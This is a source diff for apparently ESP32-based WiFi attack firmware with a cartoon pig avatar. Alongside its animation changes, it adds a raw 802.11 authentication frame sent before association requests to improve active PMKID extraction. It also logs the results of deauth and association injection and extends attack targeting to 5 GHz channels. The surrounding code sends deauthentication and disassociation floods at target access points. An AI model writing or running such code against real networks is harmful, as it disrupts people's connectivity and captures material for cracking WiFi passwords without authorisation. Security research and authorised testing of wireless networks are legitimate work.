@@ -463,9 +463,10 @@ void OinkMode::stop() {
     deauthing = false;
     scanning = false;
     
-    // Stop grass animation and the fruit tree
+    // Stop grass animation, the fruit tree, and wave ripples
     Avatar::setGrassMoving(false);
     Avatar::hideTree();
+    Avatar::waveRipple(WaveMode::NONE);
 
     // Clear our callbacks (NetworkRecon keeps running)
     NetworkRecon::setPacketCallback(nullptr);
@@ -593,18 +594,28 @@ void OinkMode::update() {
         bool wantTree = (autoState == AutoState::LOCKING ||
                          autoState == AutoState::ATTACKING ||
                          autoState == AutoState::WAITING);
-        static bool hadTree = false;
-        if (wantTree && !hadTree) {
-            uint8_t fruits = 0;
-            auto& nets = networks();
-            for (size_t i = 0; i < nets.size() && fruits < 8; i++) {
-                if (NetworkRecon::estimateClientCount(nets[i]) > 0) fruits++;
+        static bool treeShown = false;
+        static uint32_t wantTreeOffSince = 0;
+        uint32_t nowMs = millis();
+        if (wantTree) {
+            wantTreeOffSince = 0;
+            if (!treeShown) {
+                uint8_t fruits = 0;
+                auto& nets = networks();
+                for (size_t i = 0; i < nets.size() && fruits < 8; i++) {
+                    if (NetworkRecon::estimateClientCount(nets[i]) > 0) fruits++;
+                }
+                if (fruits > 0) { Avatar::showTree(fruits); treeShown = true; }
             }
-            if (fruits > 0) Avatar::showTree(fruits);
-        } else if (!wantTree && hadTree) {
-            Avatar::hideTree();
+        } else if (treeShown) {
+            // Linger a few seconds so brief hunting gaps between targets don't
+            // hide + regrow (spawn) the tree over and over.
+            if (wantTreeOffSince == 0) wantTreeOffSince = nowMs;
+            if (nowMs - wantTreeOffSince > 4000) {
+                Avatar::hideTree();
+                treeShown = false;
+            }
         }
-        hadTree = wantTree;
     }
 
     // Process pending mood: handshake complete
@@ -792,6 +803,8 @@ void OinkMode::update() {
     
     // Sync grass animation with channel hopping state
     Avatar::setGrassMoving(channelHopping);
+    // Incoming (converging) wave ripples while scanning/hopping for targets
+    if (channelHopping) Avatar::waveRipple(WaveMode::INCOMING);
     
     // Auto-attack state machine (like M5Gotchi)
     switch (autoState) {
@@ -910,7 +923,12 @@ void OinkMode::update() {
                         if (currentChannel != targetChannel) {
                             setChannel(targetChannel);
                         }
+                        // IEEE 802.11 state machine: Auth must precede Assoc, or
+                        // most APs silently drop the Assoc from an unauthed STA.
+                        sendAuthenticationRequest(targetBssid);
+                        delay(10);  // AP processes auth in <2ms; 10ms is a safe margin
                         sendAssociationRequest(targetBssid, targetSSID, strlen(targetSSID));
+                        Avatar::waveRipple(WaveMode::OUTGOING);  // radiate on the probe
                         pmkidProbeTime = now;
                         if (pmkidTargetIndex < 64) pmkidProbedBitset |= (1ULL << pmkidTargetIndex);
                         Avatar::sniff();
@@ -1158,7 +1176,9 @@ void OinkMode::update() {
                         sendDisassocFrame(targetBssidLocal, broadcast, 8);  // Some devices respond to disassoc only
                         deauthCount++;
                     }
-                    
+
+                    // Radiate an OUTGOING wave burst from the pig's nose on deauth
+                    Avatar::waveRipple(WaveMode::OUTGOING);
                     lastDeauthTime = now;
                 }
                 
@@ -1512,7 +1532,7 @@ void OinkMode::stopDeauth() {
 }
 
 void OinkMode::setChannel(uint8_t ch) {
-    if (ch < 1 || ch > 14) return;
+    if (!NetworkRecon::isValidChannel(ch)) return;  // allow 5 GHz targets on C5
     currentChannel = ch;
     // #region agent log - H1/H2 channel conflict
     Serial.printf("[DBG-H1H2] OINK setCh=%d reconCh=%d reconLocked=%d\n", ch, NetworkRecon::getCurrentChannel(), NetworkRecon::isChannelLocked() ? 1 : 0);
@@ -2736,8 +2756,14 @@ void OinkMode::sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uin
     memcpy(deauthPacket + 10, bssid, 6);
     memcpy(deauthPacket + 16, bssid, 6);
     deauthPacket[24] = reason;
-    
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+
+    esp_err_t _txr = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    static bool _deauthLogged = false;
+    if (!_deauthLogged) {
+        _deauthLogged = true;
+        Serial.printf("[DIAG-TX] first deauth ch=%d ret=%d (0=ESP_OK; nonzero=injection blocked)\n",
+                      currentChannel, (int)_txr);
+    }
 }
 
 void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uint8_t count) {
@@ -2802,6 +2828,28 @@ void OinkMode::sendDisassocFrame(const uint8_t* bssid, const uint8_t* station, u
     esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
 }
 
+void OinkMode::sendAuthenticationRequest(const uint8_t* bssid) {
+    // 802.11 Authentication Request (Open System) — required before Association.
+    // Most APs silently drop Assoc Requests from unauthenticated STAs.
+    uint8_t authFrame[30] = {};
+    authFrame[0] = 0xB0;  // FC: Type=Management, Subtype=Authentication
+    authFrame[1] = 0x00;
+    memcpy(authFrame + 4, bssid, 6);   // Addr1: destination (AP)
+    uint8_t ourMac[6];
+    esp_wifi_get_mac(WIFI_IF_STA, ourMac);
+    memcpy(authFrame + 10, ourMac, 6); // Addr2: source (us)
+    memcpy(authFrame + 16, bssid, 6);  // Addr3: BSSID
+    // Auth body: Algorithm=Open System(0), Seq=1, Status=Success(0)
+    authFrame[26] = 0x01;              // Authentication SEQ: 1
+    esp_err_t _txr = esp_wifi_80211_tx(WIFI_IF_STA, authFrame, sizeof(authFrame), false);
+    static bool _authLogged = false;
+    if (!_authLogged) {
+        _authLogged = true;
+        Serial.printf("[DIAG-TX] first auth ch=%d ret=%d (0=ESP_OK; nonzero=injection blocked)\n",
+                      currentChannel, (int)_txr);
+    }
+}
+
 void OinkMode::sendAssociationRequest(const uint8_t* bssid, const char* ssid, uint8_t ssidLen) {
     // 802.11 Association Request for active PMKID extraction
     uint8_t assocReq[128];
@@ -2859,7 +2907,13 @@ void OinkMode::sendAssociationRequest(const uint8_t* bssid, const char* ssid, ui
     assocReq[bodyOffset++] = 0x18;  // 12 Mbps
     assocReq[bodyOffset++] = 0x24;  // 18 Mbps
     
-    esp_wifi_80211_tx(WIFI_IF_STA, assocReq, bodyOffset, false);
+    esp_err_t _txr = esp_wifi_80211_tx(WIFI_IF_STA, assocReq, bodyOffset, false);
+    static bool _assocLogged = false;
+    if (!_assocLogged) {
+        _assocLogged = true;
+        Serial.printf("[DIAG-TX] first assoc ch=%d ret=%d (0=ESP_OK; nonzero=injection blocked)\n",
+                      currentChannel, (int)_txr);
+    }
 }
 
 void OinkMode::clearTargetClients() {
